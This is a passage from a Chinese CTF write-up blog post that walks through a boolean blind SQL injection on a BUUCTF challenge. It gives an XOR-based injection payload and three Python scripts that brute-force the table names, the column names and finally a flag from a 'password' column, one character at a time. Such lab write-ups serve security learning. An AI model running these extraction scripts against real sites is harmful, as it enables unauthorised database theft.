+<p>然后得出数据库名为geek，这里延时了一点点，因为不知为什么会有几次漏了一些字符没有</p>
+<p>然后改一改代码继续爆表名，参考上面文章可以用该语句先去测试一下表名长度，得出长度为16</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1^((select(length(group_concat(TABLE_NAME)))from(information_schema.tables)where(table_schema=&quot;geek&quot;))=16)<br></code></pre></td></tr></table></figure>
+
+<p>emmm后来发现不止两个表，我就直接写50个字符来爆了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr((select(group_concat(table_name))from(information_schema.columns)where(table_schema=&#x27;geek&#x27;)),%d,1))=%d)&quot;</span>%(i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303224502079.png" alt="image-20240303224502079" class="lazyload"></p>
+<p>然后爆出上面四个表名</p>
+<p>再去爆一下字段名看看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br>name1=<span class="hljs-string">&quot;F1naI1y&quot;</span><br>name2=<span class="hljs-string">&quot;FnaI1y,&quot;</span><br>name3=<span class="hljs-string">&quot;Fa1y&quot;</span><br>name4=<span class="hljs-string">&quot;Flaaag&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>%(name1,i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<p>这个Flaaag里面没有东西，然后去爆name2，出了下面三个字段名</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303225537909.png" alt="image-20240303225537909" class="lazyload"></p>
+<p>不过到后面连接超时了，不管了不想爆了()，总之在password这个字段</p>
+<p>然后去爆password字段的值拿flag，这里用正则匹配来直接获取含有flag的数据来爆节省时间</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br>name1=<span class="hljs-string">&quot;F1naI1y&quot;</span><br>name2=<span class="hljs-string">&quot;FnaI1y,&quot;</span><br>name3=<span class="hljs-string">&quot;Fa1y&quot;</span><br>name4=<span class="hljs-string">&quot;Flaaag&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,<span class="hljs-number">80</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">f&quot;(ord(substr((select(group_concat(password))from(F1naI1y)where((password)regexp&#x27;flag&#x27;)),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;j&#125;</span>)&quot;</span><br>        response=requests.get(url=url+sql,timeout=<span class="hljs-number">3</span>)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303234305001.png" alt="image-20240303234305001" class="lazyload"></p>
+
+	</article>
+
+	 
+    <div class="kira-post-copyright">
+        <strong>Author：</strong>clown<br>
+        <strong>Link：</strong><a href="https://clowsman.github.io/2024/03/02/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/" title="https:&#x2F;&#x2F;clowsman.github.io&#x2F;2024&#x2F;03&#x2F;02&#x2F;buu做题记录1&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;clowsman.github.io&#x2F;2024&#x2F;03&#x2F;02&#x2F;buu做题记录1&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+  
+	<div class="kira-post-nav">
+		<nav class="post-nav">
+			          
+			<!-- 先找到与当前文字相同的目录 -->
+			      
+			<!-- 在找到当前文章所在的 index -->
+			    
+			<!-- 上一篇文章 -->
+			<div class="old">
+				<span>上一章</span>
+				<a href="/2023/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"> 反序列化</a>
+			</div>
+			                      
+		</nav>
+	</div>
+	
+	<div class="kira-post-meta kira-rainbow">
+		
+			<a class="kirafont icon-container-fill -link" href="/categories/web/">web</a>
+		
+		
+			<a class="kirafont icon-tag-fill -none-link" href="/tags/ctf-%E5%88%B7%E9%A2%98/" rel="tag">ctf 刷题</a>
+		
+	</div>
+	
+		<script src="/js/kira-code-copy.js"></script>
+	
+	
+	<div class="kira-post-footer">
+		
+
+		
+	<div class="giscus"></div>
+  
+    <script src="https://giscus.app/client.js"
+      data-repo="ch1ny/ch1ny.github.io"
+      data-repo-id="R_kgDOHGgizw"
+      data-category="General"
+      data-category-id="DIC_kwDOHGgiz84CU88t"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="en"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async  
+    ></script>
+  
+
+	</div>
+	
+</div>
+
+				</div>
+			</div>
+			<div class="kira-right-column">
+	<a onclick="document.querySelector('#kira-top-header').scrollIntoView({behavior: 'smooth'});" class="kira-backtotop" aria-label="回到顶部" title="回到顶部">
+		<button class="mdui-fab mdui-ripple">
+			<i class="kirafont icon-caret-up"></i>
+		</button>
+	</a>
+</div>
+
+		</div>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
